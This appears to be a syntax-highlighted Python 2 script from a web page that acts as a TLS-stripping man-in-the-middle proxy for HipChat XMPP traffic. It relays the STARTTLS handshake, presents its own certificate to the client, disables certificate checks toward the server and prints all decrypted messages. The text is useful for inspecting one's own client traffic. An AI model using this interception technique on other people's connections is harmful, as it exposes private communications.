&lt;span style=&#34;color: #93A1A1&#34;&gt;BUF_SIZE&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8192&lt;/span&gt;
 
&lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ssl&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;binascii&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hexlify,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unhexlify&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# create socket 127.0.0.1:5222&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;#  this can&amp;#39;t be non-blocking for obvious reasons&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;listensocket&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;socket(socket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;SOCK_STREAM)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# bind it to 127.0.0.1:5222&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;listensocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;bind((PROXY_HOST,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;PROXY_PORT))&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;listensocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;listen(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;# 1 for now - you can add more if you want multiple clients but we only need one&lt;/span&gt;
 
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Created socket on %s:%s and listening&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(PROXY_HOST,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;PROXY_PORT)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# now accept connections from hipchat client&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;clientsocket,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;clientaddress&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;listensocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;accept()&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# this should be localhost or 127.0.0.1&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# str is needed because otherwise it cannot be printed properly and we get an errors&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Accepted connection from %s&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;str&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(clientaddress)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# listen for xmpp_msg1 (first step of XMPP  handshake)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;xmpp_msg1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;clientsocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;recv(BUF_SIZE)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Received msg from client:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;%s&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(xmpp_msg1)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# create a connection to srver and send it&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;serversocket&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;socket(socket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;SOCK_STREAM)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;serversocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;connect(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(REMOTE_HOST,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;REMOTE_PORT)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Connected to server at %s:%s&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(REMOTE_HOST,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;REMOTE_PORT)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# send xmpp_msg1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;serversocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;sendall(xmpp_msg1)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Sending xmpp_msg1 to server&amp;quot;&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# receive xmpp_msg2 from server&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;xmpp_msg2&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;serversocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;recv(BUF_SIZE)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Received msg from server:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;%s&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(xmpp_msg2)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# relay it to client&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;clientsocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;sendall(xmpp_msg2)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Send xmpp_msg2 to client&amp;quot;&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# receive xmpp_msg3&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;xmpp_msg3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;clientsocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;recv(BUF_SIZE)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Received xmpp_msg3 (STARTTLS) from client:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;%s&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(xmpp_msg3)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# this should be the STARTTLS one&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# &amp;lt;starttls xmlns=&amp;#39;urn:ietf:params:xml:ns:xmpp-tls&amp;#39;/&amp;gt;&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# relay it to server&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;serversocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;sendall(xmpp_msg3)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Sent xmpp_msg3 (STARTTLS) to server&amp;quot;&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# receive xmpp_msg4 from server&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;xmpp_msg4&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;serversocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;recv(BUF_SIZE)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Received xmpp_msg4 (PROCEED) from server:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;%s&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(xmpp_msg4)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# this should be PROCEED&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# &amp;lt;proceed xmlns=&amp;#39;urn:ietf:params:xml:ns:xmpp-tls&amp;#39;/&amp;gt;&lt;/span&gt;
 
&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;proceed&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xmpp_msg4:&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt; [+] Something went wrong, server did not respond with proceed&amp;quot;&lt;/span&gt;
    &lt;span style=&#34;color: #B58900&#34;&gt;exit&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;()&lt;/span&gt;
 
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;clientsocket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;sendall(xmpp_msg4)&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Sending xmpp_msg4 (PROCEED) to client&amp;quot;&lt;/span&gt;
 
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Going TLS&amp;quot;&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# now we must wrap our sockets in TLS&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# fortunately this is very easy in Python&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# converting clientsocket to TLS&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# modify the path host.crt and host.key (if they are not in the same directory)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tlsclient&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ssl&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;wrap_socket(clientsocket,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;keyfile&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;host.key&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;certfile&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;host.crt&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;server_side&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;True&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;cert_reqs&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ssl&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;CERT_NONE)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# set it to non-blocking&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tlsclient&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;setblocking(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# set timeout to 0.5 sec&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tlsclient&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;settimeout(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0.5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# ssl.CERT_NONE == cert is not required and will not be validated if provided&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# this is not generally safe but we know the endpoint in this scenario&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# this means, don&amp;#39;t care if hipchatserver.com responds with a crappy certificate&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tlsserver&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ssl&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;wrap_socket(serversocket,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;server_side&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;False&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;cert_reqs&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ssl&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;CERT_NONE)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tlsserver&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;setblocking(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tlsserver&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;settimeout(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0.5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# SSL added and removed here :^)&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# 2meta4me&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# now we are going to juggle connections&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# listen on one for half a second and send on the other one then vice versa&lt;/span&gt;
 
&lt;span style=&#34;color: #719e07&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;try&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #586E75&#34;&gt;# receive on client-side&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;msg_from_client&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;tlsclient&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;recv(BUF_SIZE)&lt;/span&gt;
        &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Received from client:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;%s&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;str&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(msg_from_client)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 
        &lt;span style=&#34;color: #93A1A1&#34;&gt;tlsserver&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;sendall(msg_from_client)&lt;/span&gt;
 
	&lt;span style=&#34;color: #586E75&#34;&gt;# sockets are non-blocking which means that they will timeout&lt;/span&gt;
	&lt;span style=&#34;color: #586E75&#34;&gt;# here we check if they actually timedout&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;error&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket_exception:&lt;/span&gt;
        &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;timed out&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;str&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(socket_exception):&lt;/span&gt;
            &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Error receiving data from client&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;%s&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;str&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(socket_exception)&lt;/span&gt;
 
    &lt;span style=&#34;color: #719e07&#34;&gt;try&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;msg_from_server&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;tlsserver&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;recv(BUF_SIZE)&lt;/span&gt;
        &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Received from server:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;%s&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;str&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(msg_from_server)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
		
        &lt;span style=&#34;color: #93A1A1&#34;&gt;tlsclient&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;sendall(msg_from_server)&lt;/span&gt;
 
    &lt;span style=&#34;color: #719e07&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;error&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket_exception:&lt;/span&gt;
         &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;timed out&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;str&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(socket_exception):&lt;/span&gt;
            &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;[+] Error receiving data from server&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;%s&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;str&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(socket_exception)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
